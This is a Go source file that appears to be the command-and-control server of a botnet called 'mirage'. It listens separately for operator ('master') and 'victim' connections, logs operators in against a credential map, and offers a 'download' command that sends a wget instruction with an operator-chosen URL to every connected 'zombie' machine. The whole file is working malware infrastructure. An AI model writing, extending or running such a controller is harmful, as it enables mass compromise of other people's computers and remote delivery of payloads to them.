package main

import (
	"bufio"
	"fmt"
	"mirage/global"
	"mirage/util"
	"net"
	"strings"
)

func main() {
	// Master Listener
	listenerMaster, err := net.Listen(global.CONN_TYPE, fmt.Sprintf("%s:%d", global.CNC_ADDR, global.MASTER_PORT))

	if err != nil {
		panic(fmt.Sprintln("Error listening: ", err.Error()))
	}
	defer listenerMaster.Close()

	// Victim Listener
	listenerVictim, err := net.Listen(global.CONN_TYPE, fmt.Sprintf("%s:%d", global.CNC_ADDR, global.VICTIM_PORT))

	if err != nil {
		panic(fmt.Sprintln("Error listening: ", err.Error()))
	}
	defer listenerMaster.Close()
	fmt.Printf("Master on %s:%d\nVictim on %s:%d", global.CNC_ADDR, global.MASTER_PORT, global.CNC_ADDR, global.VICTIM_PORT)

	go acceptConnection(&listenerVictim)
	acceptConnection(&listenerMaster)
}

func handleLogin(conn *net.Conn) {
	defer (*conn).Close()

	for {
		(*conn).Write([]byte("Login: "))
		username, _ := bufio.NewReader(*conn).ReadString('\n')

		(*conn).Write([]byte("Password: "))
		password, _ := bufio.NewReader(*conn).ReadString('\n')

		value, isInsideMap := global.Users_cred[username]
		if isInsideMap && value == password {
			util.ClearScreen(conn)
			(*conn).Write([]byte(util.ReturnBanner(username)))
			handleCommand(conn)
		} else {
			(*conn).Write([]byte("[Error] Wrong Username/Password.\r\n"))
		}
	}
}

func handleCommand(conn *net.Conn) {
	for {
		if !util.Contains(global.VictimsConnection, conn) {
			(*conn).Write([]byte("\033[31;97m)―――▶ "))
			cmd, _ := bufio.NewReader(*conn).ReadString('\n')

			if strings.Compare(cmd, "exit\r\n") == 0 {
				(*conn).Close()
			} else if strings.Contains(cmd, "download ") {
				for _, zombieConn := range global.VictimsConnection {
					(*zombieConn).Write([]byte(fmt.Sprintf("%s %s", "wget", cmd[9:len(cmd)-2])))
				}
			} else if strings.Compare(cmd, "clear\r\n") == 0 {
				util.ClearScreen(conn)
			} else {
				(*conn).Write([]byte("Command not found.\r\n"))
			}
		}
	}
}
